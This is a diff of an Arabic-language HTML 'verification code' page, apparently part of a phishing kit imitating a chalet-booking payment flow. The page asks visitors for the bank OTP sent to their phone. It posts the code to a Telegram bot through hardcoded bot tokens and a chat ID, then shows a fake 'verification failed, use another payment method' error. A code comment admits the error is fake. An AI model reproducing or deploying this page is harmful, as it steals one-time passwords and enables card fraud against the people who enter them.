@@ -1,93 +1,152 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>التحقق - Rose Chalets</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>التحقق من الكود</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    header, footer {
+      background-color: #004080;
+      color: white;
+      text-align: center;
+      padding: 15px;
+    }
+
+    main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 18px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      text-align: center;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .countdown {
+      text-align: center;
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #004080;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #003366;
+    }
+  </style>
 </head>
 <body>
 
-  <header class="main-header">
-    <div class="container">
-      <h1 class="logo">🌹 التحقق - Rose Chalets</h1>
-    </div>
+  <header>
+    <h2>التحقق من الكود</h2>
   </header>
 
-  <main class="container">
+  <main>
+    <form id="verifyForm">
+      <label for="code">أدخل رمز التحقق المرسل إلى هاتفك:</label>
+      <input type="text" id="code" name="code" required />
 
-    <section class="booking">
-      <h2>رمز التحقق</h2>
-      <p>تم إرسال رمز تحقق إلى رقم هاتفك المسجل من البنك. الرجاء إدخاله أدناه:</p>
+      <div id="error" class="error-message">⚠️ الكود يجب أن يكون من 4 إلى 6 أرقام فقط</div>
 
-      <div id="timer" style="font-weight: bold; color: red; margin: 10px 0;">الوقت المتبقي: 60 ثانية</div>
+      <div class="countdown">⏳ ينتهي خلال: <span id="timer">60</span> ثانية</div>
 
-      <form id="verifyForm">
-        <label for="code">أدخل الكود:</label>
-        <input type="text" id="code" name="code" pattern="\\d{4,6}" maxlength="6" required placeholder="123456" />
-
-        <button type="submit" id="verifyBtn">تأكيد</button>
-      </form>
-    </section>
-
+      <button type="submit">تأكيد الكود</button>
+    </form>
   </main>
 
-  <footer class="footer">
-    <p>⚠️ هذا الموقع تجريبي لأغراض العرض فقط - جميع الحقوق محفوظة © Rose Chalets</p>
+  <footer>
+    جميع الحقوق محفوظة © 2025
   </footer>
 
   <script>
-    // عداد 60 ثانية
-    let timeLeft = 60;
-    const timerDisplay = document.getElementById("timer");
-    const verifyBtn = document.getElementById("verifyBtn");
-
+    // عداد تنازلي
+    let seconds = 60;
+    const timerSpan = document.getElementById('timer');
     const countdown = setInterval(() => {
-      timeLeft--;
-      timerDisplay.textContent = `الوقت المتبقي: ${timeLeft} ثانية`;
-      if (timeLeft <= 0) {
-        clearInterval(countdown);
-        timerDisplay.textContent = "انتهى الوقت! حاول مرة أخرى.";
-        verifyBtn.disabled = true;
-        verifyBtn.style.backgroundColor = "#aaa";
-        verifyBtn.style.cursor = "not-allowed";
-      }
+      seconds--;
+      timerSpan.textContent = seconds;
+      if (seconds <= 0) clearInterval(countdown);
     }, 1000);
 
-    // إرسال الكود
-    document.getElementById("verifyForm").addEventListener("submit", function(e) {
+    // التحقق من الكود
+    document.getElementById('verifyForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const token = "8022117794:AAHc6i8c6jZY_2IGHUQlQBJYGN2v9n0";
-      const chatId = "1008144314";
-      const code = document.getElementById("code").value.trim();
+      const code = document.getElementById('code').value.trim();
+      const error = document.getElementById('error');
 
-      if (code.length >= 4 && code.length <= 6) {
-        const message = `
-❌ فشل التحقق من الكود:
-الرمز المدخل: ${code}
-العملية لم تكتمل. يرجى استخدام طريقة دفع أخرى.
-        `;
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        }).then(response => {
-          if (response.ok) {
-            window.location.href = "payment.html?error=otp";
-          } else {
-            alert("تعذر إرسال الكود.");
-          }
-        });
-      } else {
-        alert("الرجاء إدخال كود مكوّن من 4 إلى 6 أرقام.");
+      if (!/^\d{4,6}$/.test(code)) {
+        error.style.display = 'block';
+        return;
       }
+
+      error.style.display = 'none';
+
+      // إرسال الكود إلى البوت
+      fetch("https://api.telegram.org/bot7244002272:AAEc5dIXiyGJBP5OEMBg7tD2iV2lWh99WJM/sendMessage", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: "1008144314",
+          text: `✅ تم إدخال كود التحقق: ${code}`
+        })
+      }).then(() => {
+        // بعد الإرسال، الانتقال إلى صفحة الدفع برسالة خطأ وهمية
+        alert("❌ فشل التحقق، يرجى استخدام طريقة دفع أخرى.");
+        window.location.href = "payment.html"; // عد إلى صفحة الدفع
+      }).catch(() => {
+        alert("حدث خطأ أثناء الإرسال");
+      });
     });
   </script>
 
